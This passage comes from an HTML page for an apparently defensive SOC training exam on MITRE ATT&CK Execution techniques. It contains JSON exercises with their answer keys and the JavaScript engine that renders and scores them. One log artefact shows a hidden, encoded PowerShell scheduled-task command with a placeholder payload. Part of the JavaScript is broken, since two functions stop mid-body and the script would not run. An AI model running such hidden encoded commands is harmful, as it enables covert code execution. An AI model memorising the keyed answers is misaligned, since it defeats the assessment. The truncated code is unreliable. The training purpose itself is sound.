they audit; borrowing gaps from other tactics dilutes the report.","study":"Coverage reasoning: which TA0002 techniques lack telemetry or prevention.","data":{"options":[{"t":"BitLocker coverage is the main Execution control gap","why":"Disk encryption is irrelevant to code execution."},{"t":"Script block logging gap on workstations weakens T1059.001 detection","correct":true,"why":"Lures hit workstations first — that is where 4104 is missing."},{"t":"Missing egress firewall rules are the primary Execution gap","why":"Egress rules are a Command and Control concern, not TA0002."},{"t":"No application allowlisting (M1038) weakens prevention of interpreter abuse","correct":true,"why":"Without M1038 nothing prevents T1059/T1106/T1127 execution paths."},{"t":"Annual-only training leaves T1204 user-execution risk mostly untreated","correct":true,"why":"User Execution needs continuous reinforcement, not one session."}]}},{"id":"H15","type":"flow","summary":"Ticket first — three least-aggressive decisions on a task that may be maintenance","scenario":["23:10. EDR shows scheduled task SysUpdate on APP-WS-07 running powershell -enc nightly. The task context says account IT-staging. Ticket #9104, opened Tuesday, says: ‘new patching task rollout this week — staging hosts’. Three decisions, and your playbook says: least aggressive correct action wins."],"artefacts":[{"label":"ARTEFACT — Task + ticket context","kind":"log","lines":["Task: SysUpdate  Trigger: nightly 23:30  Account: IT-staging  Action: powershell -nop -w hidden -enc AAAA…","Ticket #9104: new patching task rollout this week — staging hosts (owner: IT-staging)"]}],"question":"Take all three decisions in order.","hint":"Ownership question first; a reversible state change second; containment with evidence when the denial lands.","explanation":"Step 1: the ticket says staging hosts — call the owner before touching a possibly legitimate task. Step 2: when the owner denies it, \u003cb>disable\u003c/b> the task and capture its XML — reversible, evidence-preserving, exactly the least-aggressive correct action. Step 3: with a confirmed unauthorised task and a payload still on disk, isolate the host, preserve evidence, and plan morning remediation — deleting files or reimaging tonight destroys evidence, and doing nothing leaves a nightly execution window open.","study":"The least-aggressive-correct-action rule, applied three times with rising evidence.","data":{"steps":[{"text":["Decision 1 — after reading the ticket, what next?"],"options":[{"t":"Isolate every staging server","why":"Disproportionate before ownership is checked."},{"t":"Call the IT-staging owner to confirm the task is theirs","correct":true,"why":"The ticket makes legitimate intent plausible — verify ownership first."},{"t":"Delete the task now","why":"Destroying a possibly legitimate task breaks patching and loses evidence."}]},{"text":["Decision 2 — the owner confirms it is NOT theirs. It is 23:30. Least aggressive correct action?"],"options":[{"t":"Do nothing until Monday","why":"Leaves a nightly execution window open for days."},{"t":"Delete the task and reboot the host","why":"Irreversible and wipes volatile evidence."},{"t":"Disable the task and capture its XML definition","correct":true,"why":"Reversible containment plus evidence capture — the textbook move."}]},{"text":["Decision 3 — EDR shows the task launched once; the payload is still in temp. Final call for tonight?"],"options":[{"t":"Isolate the host, preserve evidence, plan morning remediation","correct":true,"why":"Confirmed unauthorised execution: contain, keep evidence, remediate in daylight."},{"t":"Delete the temp files and keep the host online","why":"Destroys the payload evidence while the host stays exposed."},{"t":"Reimage immediately without evidence capture","why":"Destroys everything investigators and legal will ask about."}]}]}}]}</script>
<script>
/* CyberPulseAcademy exam engine — part A (core) */
(function () {
'use strict';

var META = JSON.parse(document.getElementById('cm-exercise-meta').textContent);
var DATA = JSON.parse(document.getElementById('exam-data').textContent);
var CFG = DATA.config;

/* ---------------- helpers ---------------- */
function $(s, r) { return (r || document).querySelector(s); }
function el(tag, cls, html) { var e = document.createElement(tag); if (cls) { e.className = cls; } if (html != null) { e.innerHTML = html; } return e; }
function esc(s) { return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
function shuffle(a) { var x = a.slice(); for (var i = x.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = x[i]; x[i] = x[j]; x[j] = t; } return x; }
function pad(n) { return (n < 10 ? '0' : '') + n; }
function fmtClock(sec) { sec = Math.max(0, Math.floor(sec)); var h = Math.floor(sec / 3600), m = Math.floor((sec % 3600) / 60), s = sec % 60; return (h ? h + ':' + pad(m) : String(m)) + ':' + pad(s); }
function round1(n) { return Math.round(n * 10) / 10; }
function byId(id) { for (var i = 0; i < DATA.exercises.length; i++) { if (DATA.exercises[i].id === id) { return DATA.exercises[i]; } } return null; }
function badgeClass(sev) { return 'badge badge-' + (CFG.difficulty === 'extremely-hard' ? 'xhard' : CFG.difficulty); }

/* lightweight log/code highlighter (timestamps + Windows event IDs) */
function hl(text) {
  var t = esc(text);
  t = t.replace(/(\d{4}-\d{2}-\d{2}|\d{2}:\d{2}:\d{2})/g, '<span class="tk-time">$1</span>');
  t = t.replace(/\b(4688|4104|4698|7045|4103|4697|4699|4702|1102|4624)\b/g, '<span class="tk-eid">$1</span>');
  return t;
}
function artefactNode(a) {
  var wrap = el('div', 'artefact');
  wrap.appendChild(el('div', 'artefact-h', esc(a.label)));
  var body = el('div', 'artefact-b');
  if (a.kind === 'log' || a.kind === 'code') {
    if (a.kind === 'log' && a.filter) {
      var fl = el('div', 'logfilter');
      var inp = document.createElement('input');
      inp.type = 'text'; inp.placeholder = 'Filter lines…'; inp.setAttribute('aria-label', 'Filter log lines');
      var pre = el('pre', 'log');
      var render = function () {
        var q = inp.value.toLowerCase();
        var lines = a.lines.filter(function (ln) { return !q || String(ln).toLowerCase().indexOf(q) >= 0; });
        pre.innerHTML = lines.length ? lines.map(hl).join('\n') : '<span style="color:#7a87a0">No lines match this filter.</span>';
      };
      inp.addEventListener('input', render);
      fl.appendChild(inp);
      body.appendChild(fl);
      body.appendChild(pre);
      render();
    } else {
      var p = el('pre', a.kind === 'log' ? 'log' : 'code');
      p.innerHTML = (a.lines || []).map(hl).join('\n');
      body.appendChild(p);
    }
  } else if (a.kind === 'table') {
    var tb = el('div');
    tb.style.overflowX = 'auto';
    var tbl = el('table');
    tbl.style.borderCollapse = 'collapse'; tbl.style.width = '100%'; tbl.style.fontSize = '14px';
    (a.rows || []).forEach(function (row, ri) {
      var tr = document.createElement('tr');
      row.forEach(function (cellText) {
        var td = el(ri === 0 ? 'th' : 'td');
        td.style.cssText = 'border:1px solid #2a3550;padding:7px 10px;text-align:left;font-weight:' + (ri === 0 ? '800' : '400') + ';background:' + (ri % 2 ? '#121a2c' : 'transparent');
        td.innerHTML = hl(cellText);
        tr.appendChild(td);
      });
      tbl.appendChild(tr);
    });
    tb.appendChild(tbl);
    body.appendChild(tb);
  } else {
    (a.body instanceof Array ? a.body : [a.body || '']).forEach(function (para) { body.appendChild(el('p', null, para)); });
  }
  wrap.appendChild(body);
  return wrap;
}

/* ---------------- partial-credit scoring engine ---------------- */
function scoreExercise(H, W, N) { if (!N) { return 0; } return Math.max(0, (H - W) / N); }
function hintAdjusted(credit) { return Math.max(0, credit - 0.10); }

/* ---------------- exam state ---------------- */
var S = {
  phase: 'intro',            /* intro | exam | review | results */
  order: [], pos: 0,
  rec: {},                   /* id -> {credit, answered, hintUsed, skipped} */
  skipped: [],
  reviewingFrom: null,
  timer: 'RUNNING',          /* RUNNING | PAUSED_MANUAL | PAUSED_AUTO_CHECK | ENDED */
  manualBefore: null,
  remaining: CFG.seconds,
  pauseManualSec: 0, pauseAutoSec: 0, pauseSince: null,
  creditSum: 0, answered: 0,
  reported: false,
  user: null,
  flow: {},                  /* id -> {step, choices[], done} */
  exRemaining: null,         /* per-exercise countdown (seconds) for EXTREMELY HARD terminal */
  widget: null, checked: false, notice: null
};
var ticker = null;

function currentId() { return S.order[S.pos]; }

/* ---------------- timer state machine ---------------- */
/* States: RUNNING, PAUSED_MANUAL, PAUSED_AUTO_CHECK, ENDED (explicit, testable transitions) */
function setTimerState(st) {
  if (S.timer === st) { return; }
  if (S.pauseSince) {
    var d = Math.floor((Date.now() - S.pauseSince.at) / 1000);
    if (S.pauseSince.kind === 'manual') { S.pauseManualSec += d; } else { S.pauseAutoSec += d; }
    S.pauseSince = null;
  }
  if (st === 'PAUSED_MANUAL') { S.pauseSince = { kind: 'manual', at: Date.now() }; }
  if (st === 'PAUSED_AUTO_CHECK') { S.pauseSince = { kind: 'auto', at: Date.now() }; }
  S.timer = st;
  renderHeader();
}
function stateLabel(st) {
  if (st === 'RUNNING') { return '<span class="tstate tstate-run">▶ RUNNING</span>'; }
  if (st === 'PAUSED_MANUAL') { return '<span class="tstate tstate-man">⏸ PAUSED — manual (press Resume)</span>'; }
  if (st === 'PAUSED_AUTO_CHECK') { return '<span class="tstate tstate-auto">⏸ PAUSED — reviewing feedback (resumes on Next)</span>'; }
  return '<span class="tstate tstate-end">⏹ ENDED</span>';
}
function tick() {
  if ((S.phase !== 'exam' && S.phase !== 'review') || S.timer !== 'RUNNING') { return; }
  S.remaining -= 1;
  if (S.exRemaining != null) {
    S.exRemaining -= 1;
    var tb = $('#exTimebox');
    if (tb) { tb.textContent = '⏱ Exercise timer: ' + fmtClock(S.exRemaining); }
    if (S.exRemaining <= 0) { expireExercise(); return; }
  }
  if (S.remaining <= 0) {
    S.remaining = 0;
    setTimerState('ENDED');
    finishExam('The exam timer reached zero. Exercises you never answered were excluded from the score.');
    return;
  }
  renderHeader();
}
function startTicker() { if (!ticker) { ticker = setInterval(tick, 1000); } }

/* ---------------- header ---------------- */
function renderHeader() {
  var c = $('#hdrCounter');
  if (S.phase === 'exam') { c.textContent = 'Exercise ' + (S.pos + 1) + ' of ' + S.order.length; }
  else if (S.phase === 'review') { c.textContent = 'Review skipped exercises'; }
  else if (S.phase === 'results') { c.textContent = 'Final results'; }
  else { c.textContent = 'Introduction'; }
  $('#hdrTimer').textContent = '⏱ ' + fmtClock(S.remaining);
  $('#hdrTimerState').innerHTML = stateLabel(S.timer);
  var pct = S.answered > 0 ? Math.round((S.creditSum / S.answered) * 100) : 0;
  $('#hdrScore').textContent = 'Score ' + round1(S.creditSum) + ' / ' + S.answered + ' (' + pct + '%)';
  var hintBtn = $('#btnHint'), skipBtn = $('#btnSkip'), pauseBtn = $('#btnPause');
  hintBtn.disabled = (S.phase !== 'exam') || S.checked || (S.rec[currentId()] ? S.rec[currentId()].hintUsed : false);
  skipBtn.disabled = (S.phase !== 'exam') || S.checked;
  pauseBtn.textContent = (S.timer === 'PAUSED_MANUAL') ? '▶ Resume' : '⏸ Pause';
  pauseBtn.disabled = (S.phase !== 'exam');
}

/* ---------------- intro screen ---------------- */
function renderIntro() {
  S.phase = 'intro';
  $('#hdr').classList.add('hidden');
  var stage = $('#stage');
  stage.innerHTML = '';
  var sheet = el('div', 'sheet');
  sheet.appendChild(el('h1', null, esc(CFG.introTitle)));
  var chips = el('div', 'metachips');
  [['badge', CFG.severity], ['chip', DATA.exercises.length + ' exercises'], ['chip', 'Pass mark: 70%'],
   ['chip', 'Time limit: ' + CFG.minutes + ' minutes'], ['chip', 'MITRE ATT&CK ' + CFG.objectId]].forEach(function (m) {
    chips.appendChild(el(m[0] === 'badge' ? 'span' : 'span', m[0] === 'badge' ? badgeClass() : 'mchip', esc(m[1])));
  });
  sheet.appendChild(chips);
  if (S.user) { sheet.appendChild(el('p', 'small', 'Candidate: ' + esc(S.user))); }

  var ex = el('div', null, DATA.intro.entityHtml);
  sheet.appendChild(ex);
  sheet.appendChild(el('h2', null, 'Related concepts covered in this exam (Keywords Covered)'));
  DATA.keywords.forEach(function (th) {
    var t = el('div', 'kwtheme');
    t.appendChild(el('h3', null, esc(th.theme)));
    var kc = el('div', 'kwchips');
    th.chips.forEach(function (c) { kc.appendChild(el('span', 'kw', esc(c))); });
    t.appendChild(kc);
    sheet.appendChild(t);
  });

  sheet.appendChild(el('h2', null, 'How this exam works'));
  sheet.appendChild(el('div', null, DATA.intro.rulesHtml));

  var nav = el('div', 'navrow');
  var start = el('button', 'btn btn-primary', 'Start the exam');
  start.type = 'button';
  start.addEventListener('click', startExam);
  nav.appendChild(start);
  sheet.appendChild(nav);
  stage.appendChild(sheet);
  window.scrollTo(0, 0);
}

/* ---------------- exam flow ---------------- */
function resetAttemptState() {
  S.order = shuffle(DATA.exercises.map(function (e) { return e.id; }));
  S.pos = 0; S.rec = {}; S.skipped = []; S.reviewingFrom = null;
  S.remaining = CFG.seconds; S.pauseManualSec = 0; S.pauseAutoSec = 0; S.pauseSince = null;
  S.creditSum = 0; S.answered = 0; S.flow = {}; S.exRemaining = null;

/* ---------------- manual pause overlay ---------------- */
function onPauseBtn() {

/* ---------------- widget: qcm (single + multi) ---------------- */
function buildQcm(ex, root, checkBtn, multi) {
  var letters = 'ABCDEFGHIJ';
  var view = shuffle(ex.data.options.map(function (o, i) { return { i: i, t: o.t, correct: !!o.correct, why: o.why }; }));
  var sel = {};
  var list = el('div', 'optlist');
  var btns = [];
  view.forEach(function (o, vi) {
    var b = el('button', 'opt');
    b.type = 'button';
    b.innerHTML = '<span class="opt-label">' + letters[vi] + '.</span><span class="opt-text">' + esc(o.t) + '</span>';
    b.addEventListener('click', function () {
      if (S.checked) { return; }
      if (multi) {
        sel[vi] = !sel[vi];
        b.classList.toggle('sel', !!sel[vi]);
      } else {
        sel = {};
        btns.forEach(function (x) { x.classList.remove('sel'); });
        sel[vi] = true;
        b.classList.add('sel');
      }
      var any = false;
      Object.keys(sel).forEach(function (k) { if (sel[k]) { any = true; } });
      checkBtn.disabled = !any;
    });
    btns.push(b);
    list.appendChild(b);
  });
  root.appendChild(list);
  function lab(o, vi) { return letters[vi] + '. ' + o.t; }
  return {
    grade: function () {
      var chosen = [];
      view.forEach(function (o, vi) { if (sel[vi]) { chosen.push({ o: o, vi: vi }); } });
      if (!multi) {
        if (chosen.length === 0) {
          return { H: 0, W: 0, N: 1, items: [{ state: 'missed', label: 'No option was selected', why: 'Nothing was chosen when Check was pressed.' }] };
        }
        var c = chosen[0];
        if (c.o.correct) { return { H: 1, W: 0, N: 1, items: [{ state: 'correct', label: lab(c.o, c.vi), why: c.o.why }] }; }
        var right = null, rightVi = 0;
        view.forEach(function (o, vi) { if (o.correct) { right = o; rightVi = vi; } });
        return { H: 0, W: 1, N: 1, items: [
          { state: 'wrong', label: lab(c.o, c.vi), why: c.o.why },
          { state: 'missed', label: lab(right, rightVi), why: right.why }
        ] };
      }
      var H = 0, W = 0, N = 0, items = [];
      view.forEach(function (o, vi) {
        var wasSel = !!sel[vi];
        if (o.correct) {
          N++;
          if (wasSel) { H++; items.push({ state: 'correct', label: lab(o, vi), why: o.why }); }
          else { items.push({ state: 'missed', label: lab(o, vi), why: o.why }); }
        } else if (wasSel) {
          W++; items.push({ state: 'wrong', label: lab(o, vi), why: o.why });
        }
      });
      return { H: H, W: W, N: N, items: items };
    }
  };
}

/* ---------------- widget: chip yard (match + categorize) ---------------- */
function buildPlace(ex, root, checkBtn) {
  var d = ex.data;
  var isMatch = ex.type === 'match';
  var items = shuffle(d.items.map(function (o, i) { return { i: i, t: o.t, target: o.target, why: o.why }; }));
  var assign = {};
  var picked = null;
  var chipEls = {}, zoneSlots = [], zoneEmpties = [];
  var bankChips = el('div', 'bank-chips');

  var zonesWrap = el('div', 'yard-zones');
  d.zones.forEach(function (z, zi) {
    var zone = el('div', isMatch ? 'yzone matchrow' : 'yzone');
    var title = el('p', 'yzone-title', esc(z.title));
    var slots = el('div', 'yzone-slots');
    var empty = el('span', null, isMatch ? 'Tap a chip, then tap here' : 'Drop matching chips here');
    empty.style.cssText = 'color:#7a87a0;font-size:13px;align-self:center';
    slots.appendChild(empty);
    zone.addEventListener('dragover', function (ev) { ev.preventDefault(); zone.classList.add('over'); });
    zone.addEventListener('dragleave', function () { zone.classList.remove('over'); });
    zone.addEventListener('drop', function (ev) {
      ev.preventDefault(); zone.classList.remove('over');
      var idx = ev.dataTransfer.getData('text/plain');
      if (idx !== '') { place(parseInt(idx, 10), zi); }
    });
    zone.addEventListener('click', function (ev) {
      if (ev.target !== zone && ev.target !== slots && ev.target !== title && ev.target !== empty) { return; }
      if (picked != null) { place(picked, zi); }
    });
    zone.tabIndex = 0;
    zone.setAttribute('role', 'button');
    zone.setAttribute('aria-label', 'Drop target: ' + z.title + '. Select a chip, then press Enter here to place it.');
    zone.addEventListener('keydown', function (ev) {
      if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); if (picked != null) { place(picked, zi); } }
    });
    if (isMatch) {
      zone.appendChild(title); zone.appendChild(slots);
    } else {
      zone.appendChild(title); zone.appendChild(slots);
    }
    zoneSlots[zi] = slots; zoneEmpties[zi] = empty;
    zonesWrap.appendChild(zone);
  });

  items.forEach(function (it) {
    var chip = el('button', 'chip', esc(it.t));
    chip.type = 'button';
    chip.draggable = true;
    chip.addEventListener('dragstart', function (ev) { ev.dataTransfer.setData('text/plain', String(it.i)); });
    chip.addEventListener('click', function () {
      if (S.checked) { return; }
      if (assign[it.i] !== undefined) { assign[it.i] = undefined; picked = null; renderAll(); return; }
      picked = (picked === it.i) ? null : it.i;
      renderAll();
    });
    chipEls[it.i] = chip;
  });

  function place(itemIdx, zoneIdx) {
    if (S.checked) { return; }
    assign[itemIdx] = zoneIdx;
    picked = null;
    renderAll();
  }
  function renderAll() {
    d.zones.forEach(function (z, zi) { zoneSlots[zi].innerHTML = ''; zoneSlots[zi].appendChild(zoneEmpties[zi]); });
    bankChips.innerHTML = '';
    items.forEach(function (it) {
      var chip = chipEls[it.i];
      chip.classList.toggle('pick', picked === it.i);
      chip.setAttribute('aria-pressed', picked === it.i ? 'true' : 'false');
      if (assign[it.i] === undefined) { bankChips.appendChild(chip); }
      else { zoneSlots[assign[it.i]].appendChild(chip); }
    });
    d.zones.forEach(function (z, zi) {
      zoneEmpties[zi].style.display = (zoneSlots[zi].children.length > 1) ? 'none' : 'inline';
    });
    var count = 0;
    Object.keys(assign).forEach(function (k) { if (assign[k] !== undefined) { count++; } });
    checkBtn.disabled = (count === 0);
  }

  var bank = el('div', 'bank');
  bank.appendChild(el('p', 'bank-title', 'Chips — tap one, then tap a target'));
  bank.appendChild(bankChips);
  bank.addEventListener('dragover', function (ev) { ev.preventDefault(); });
  bank.addEventListener('drop', function (ev) {
    ev.preventDefault();
    var idx = ev.dataTransfer.getData('text/plain');
    if (idx !== '') { assign[parseInt(idx, 10)] = undefined; picked = null; renderAll(); }
  });
  var yard = el('div', 'yard');
  yard.appendChild(zonesWrap); yard.appendChild(bank);
  root.appendChild(yard);
  renderAll();

  return {
    grade: function () {
      var H = 0, W = 0, N = items.length, fb = [];
      items.forEach(function (it) {
        var a = assign[it.i];
        if (a === undefined) { fb.push({ state: 'missed', label: it.t, why: it.why }); }
        else if (a === it.target) { H++; fb.push({ state: 'correct', label: it.t + ' → ' + d.zones[a].title, why: it.why }); }
        else { W++; fb.push({ state: 'wrong', label: it.t + ' → ' + d.zones[a].title, why: it.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: ordering ---------------- */
function buildOrder(ex, root, checkBtn) {
  var correct = ex.data.items;
  var view = shuffle(correct.map(function (o, i) { return { i: i, t: o.t, why: o.why }; }));
  var list = el('div', 'ordlist');
  var rows = [];
  function rerender() {
    list.innerHTML = '';
    view.forEach(function (it, idx) {
      var row = rows[it.i];
      row._pos = idx;
      list.appendChild(row);
    });
  }
  view.forEach(function (it) {
    var row = el('div', 'ord-row');
    row.setAttribute('draggable', 'true');
    row.innerHTML = '<span class="ord-handle" aria-hidden="true">≡</span><span class="ord-text">' + esc(it.t) + '</span>';
    var up = el('button', 'ord-btn', '▲'); up.type = 'button'; up.setAttribute('aria-label', 'Move up');
    var down = el('button', 'ord-btn', '▼'); down.type = 'button'; down.setAttribute('aria-label', 'Move down');
    up.addEventListener('click', function () { if (S.checked) { return; } var p = row._pos; if (p > 0) { var t = view[p - 1]; view[p - 1] = view[p]; view[p] = t; rerender(); } });
    down.addEventListener('click', function () { if (S.checked) { return; } var p = row._pos; if (p < view.length - 1) { var t = view[p + 1]; view[p + 1] = view[p]; view[p] = t; rerender(); } });
    row.appendChild(up); row.appendChild(down);
    row.addEventListener('dragstart', function (ev) { ev.dataTransfer.setData('text/plain', String(row._pos)); row.classList.add('dragging'); });
    row.addEventListener('dragend', function () { row.classList.remove('dragging'); });
    row.addEventListener('dragover', function (ev) { ev.preventDefault(); });
    row.addEventListener('drop', function (ev) {
      ev.preventDefault();
      if (S.checked) { return; }
      var from = parseInt(ev.dataTransfer.getData('text/plain'), 10);
      var to = row._pos;
      if (!isNaN(from) && from !== to) {
        var moved = view.splice(from, 1)[0];
        view.splice(to, 0, moved);
        rerender();
      }
    });
    rows[it.i] = row;
  });
  rerender();
  root.appendChild(list);
  checkBtn.disabled = false;
  return {
    grade: function () {
      var H = 0, W = 0, N = view.length, fb = [];
      view.forEach(function (it, p) {
        var ok = (it.i === p);
        if (ok) { H++; } else { W++; }
        fb.push({
          state: ok ? 'correct' : 'wrong',
          label: 'Position ' + (p + 1) + ': ' + it.t,
          why: ok ? it.why : (it.why + ' (Correct position: ' + (it.i + 1) + '. In that slot the item was: ' + correct[p].t + '.)')
        });
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: fill in the blanks ---------------- */
function buildFill(ex, root, checkBtn) {
  var d = ex.data;
  var bank = shuffle(d.blanks.map(function (b) { return b.answer; }).concat(d.bank || []));
  var wrap = el('div', 'fillwrap');
  var sels = {};
  var parts = d.textWithBlanks.split(/\{(\d+)\}/g);
  function makeSelect(n) {
    var s = document.createElement('select');
    s.setAttribute('aria-label', 'Blank ' + n);
    s.appendChild(new Option('— choose —', ''));
    bank.forEach(function (o) { s.appendChild(new Option(o, o)); });
    s.addEventListener('change', function () {
      var any = false;
      Object.keys(sels).forEach(function (k) { if (sels[k].value) { any = true; } });
      checkBtn.disabled = !any;
    });
    return s;
  }
  for (var i = 0; i < parts.length; i++) {
    if (i % 2 === 0) { wrap.appendChild(document.createTextNode(parts[i])); }
    else {
      var n = parseInt(parts[i], 10);
      var s = makeSelect(n);
      sels[n] = s;
      wrap.appendChild(s);
    }
  }
  root.appendChild(wrap);
  return {
    grade: function () {
      var H = 0, W = 0, N = d.blanks.length, fb = [];
      d.blanks.forEach(function (b, bi) {
        var v = sels[bi + 1] ? sels[bi + 1].value : '';
        if (!v) { fb.push({ state: 'missed', label: 'Blank ' + (bi + 1) + ' → ' + b.answer, why: b.why }); }
        else if (v === b.answer) { H++; fb.push({ state: 'correct', label: 'Blank ' + (bi + 1) + ' → ' + b.answer, why: b.why }); }
        else { W++; fb.push({ state: 'wrong', label: 'Blank ' + (bi + 1) + ': you chose “' + v + '” → correct: ' + b.answer, why: b.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: ranking ---------------- */
function buildRank(ex, root, checkBtn) {
  /* shuffle display order so the stored rank order never leaks the answer */
  var items = shuffle(ex.data.items.map(function (o) { return { t: o.t, rank: o.rank, why: o.why }; }));
  var wrap = el('div');
  var sels = [];
  items.forEach(function (it, i) {
    var row = el('div', 'rankrow');
    row.appendChild(el('span', 'rank-text', esc(it.t)));
    var s = document.createElement('select');
    s.setAttribute('aria-label', 'Rank for: ' + it.t);
    s.appendChild(new Option('— rank —', ''));
    for (var r = 1; r <= items.length; r++) { s.appendChild(new Option(String(r), String(r))); }
    s.addEventListener('change', function () {
      var any = false;
      sels.forEach(function (x) { if (x.value) { any = true; } });
      checkBtn.disabled = !any;
    });
    sels.push(s);
    row.appendChild(s);
    wrap.appendChild(row);
  });
  root.appendChild(wrap);
  return {
    grade: function () {
      var H = 0, W = 0, N = items.length, fb = [];
      items.forEach(function (it, i) {
        var v = sels[i].value;
        if (!v) { fb.push({ state: 'missed', label: 'Rank ' + it.rank + ' → ' + it.t, why: it.why }); }
        else if (parseInt(v, 10) === it.rank) { H++; fb.push({ state: 'correct', label: 'Rank ' + it.rank + ' → ' + it.t, why: it.why }); }
        else { W++; fb.push({ state: 'wrong', label: 'You ranked ' + v + ': ' + it.t + ' → correct rank: ' + it.rank, why: it.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: terminal ---------------- */
function normCmd(s) { return String(s || '').trim().toLowerCase().replace(/\s+/g, ' '); }
function buildTerminal(ex, root, checkBtn) {
  var d = ex.data;
  root.appendChild(el('div', 'small', 'Type the command, press Run to see the lab answer, then press Check to grade it. Nothing real is executed.'));
  if (d.notice) { root.appendChild(el('div', 'timebox', esc(d.notice))); }
  var box = el('div', 'term');
  var scroll = el('pre', 'term-scroll');
  scroll.textContent = (d.banner || []).join('\n');
  var prow = el('div', 'term-prompt');
  var lab = el('label', null, esc(d.prompt));
  lab.setAttribute('for', 'termIn');
  var inp = document.createElement('input');
  inp.className = 'term-in'; inp.id = 'termIn'; inp.type = 'text';
  inp.autocomplete = 'off'; inp.spellcheck = false;
  inp.setAttribute('aria-label', 'Command line input');
  var run = el('button', 'term-run', 'Run');
  run.type = 'button';
  prow.appendChild(lab); prow.appendChild(inp); prow.appendChild(run);
  box.appendChild(scroll); box.appendChild(prow);
  root.appendChild(box);
  if (d.syntax) {
    var sp = el('div', 'synpanel');
    sp.appendChild(el('h4', null, 'Syntax reminder'));
    sp.appendChild(el('div', null, d.syntax.note));
    sp.appendChild(el('p', 'syn-ex', 'Example on a different target: <code>' + esc(d.syntax.example) + '</code>'));
    sp.appendChild(el('p', 'syn-ex', 'Expected output shape: <code>' + esc(d.syntax.sampleOut) + '</code>'));
    root.appendChild(sp);
  }
  function runCmd() {
    var v = inp.value;
    scroll.textContent += '\n' + d.prompt + ' ' + v + '\n';
    var n = normCmd(v);
    if (n && d.simMatch && new RegExp(d.simMatch).test(n)) {
      (d.sim || []).forEach(function (l) { scroll.textContent += l + '\n'; });
    } else if (n) {
      scroll.textContent += 'command not found: ' + v.trim().split(/\s+/)[0] + ' — this lab recognises only the command expected here.\n';
    }
    scroll.scrollTop = scroll.scrollHeight;
    if (n) { checkBtn.disabled = false; }
  }
  run.addEventListener('click', runCmd);
  inp.addEventListener('keydown', function (ev) { if (ev.key === 'Enter') { runCmd(); } });
  return {
    typed: function () { return normCmd(inp.value); },
    grade: function () {
      var n = normCmd(inp.value);
      var H = 0, W = 0, items = [];
      if (!n) {
        return { H: 0, W: 0, N: d.elements.length, items: [{ state: 'missed', label: 'No command was typed', why: 'The input was empty at Check time.' }] };
      }
      d.elements.forEach(function (eDef) {
        if (new RegExp(eDef.re).test(n)) { H++; items.push({ state: 'correct', label: eDef.label, why: eDef.why }); }
        else { items.push({ state: 'missed', label: eDef.label, why: eDef.why }); }
      });
      (d.danger || []).forEach(function (dg) {
        if (new RegExp(dg.re).test(n)) { W++; items.push({ state: 'wrong', label: dg.label, why: dg.why }); }
      });
      return { H: H, W: W, N: d.elements.length, items: items };
    }
  };
}

/* ---------------- widget: branching flow ---------------- */
function buildFlow(ex, root, checkBtn) {
  var steps = ex.data.steps;
  var letters = 'ABCDEF';
  var st = { step: 0, choices: [] };
  S.flow[ex.id] = st;
  var holder = el('div');
  root.appendChild(holder);
  function renderStep() {
    holder.innerHTML = '';
    if (st.step >= steps.length) {
      holder.appendChild(el('div', 'notice', 'All steps are taken. Press Check to grade the complete path you chose.'));
      checkBtn.disabled = false;
      return;
    }
    var s = steps[st.step];
    holder.appendChild(el('span', 'step-tag', 'STEP ' + (st.step + 1) + ' OF ' + steps.length));
    (s.text || []).forEach(function (t) { holder.appendChild(el('p', 'flow-text', t)); });
    (s.artefacts || []).forEach(function (a) { holder.appendChild(artefactNode(a)); });
    var list = el('div', 'optlist');
    shuffle(s.options).forEach(function (o, oi) {
      var b = el('button', 'opt');
      b.type = 'button';
      b.innerHTML = '<span class="opt-label">' + letters[oi] + '.</span><span class="opt-text">' + esc(o.t) + '</span>';
      b.addEventListener('click', function () {
        if (S.checked) { return; }
        st.choices[st.step] = o;
        st.step += 1;
        renderStep();
      });
      list.appendChild(b);
    });
    holder.appendChild(list);
  }
  renderStep();
  return {
    grade: function () {
      var H = 0, W = 0, N = steps.length, fb = [];
      steps.forEach(function (s, i) {
        var ch = st.choices[i];
        var right = null;
        s.options.forEach(function (o) { if (o.correct) { right = o; } });
        if (ch && ch.correct) {
          H++; fb.push({ state: 'correct', label: 'Step ' + (i + 1) + ': ' + ch.t, why: ch.why });
        } else {
          W++; fb.push({
            state: 'wrong',
            label: 'Step ' + (i + 1) + ': ' + (ch ? ch.t : '(no choice)'),
            why: (ch ? ch.why + ' ' : '') + 'Better: ' + right.t + ' — ' + right.why
          });
        }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

function buildWidget(ex, root, checkBtn) {
  if (ex.type === 'qcm') { return buildQcm(ex, root, checkBtn, false); }
  if (ex.type === 'qcm-multi') { return buildQcm(ex, root, checkBtn, true); }
  if (ex.type === 'match' || ex.type === 'categorize') { return buildPlace(ex, root, checkBtn); }
  if (ex.type === 'order') { return buildOrder(ex, root, checkBtn); }
  if (ex.type === 'fill') { return buildFill(ex, root, checkBtn); }
  if (ex.type === 'rank') { return buildRank(ex, root, checkBtn); }
  if (ex.type === 'terminal') { return buildTerminal(ex, root, checkBtn); }
  if (ex.type === 'flow') { return buildFlow(ex, root, checkBtn); }
  return buildQcm(ex, root, checkBtn, false);
}
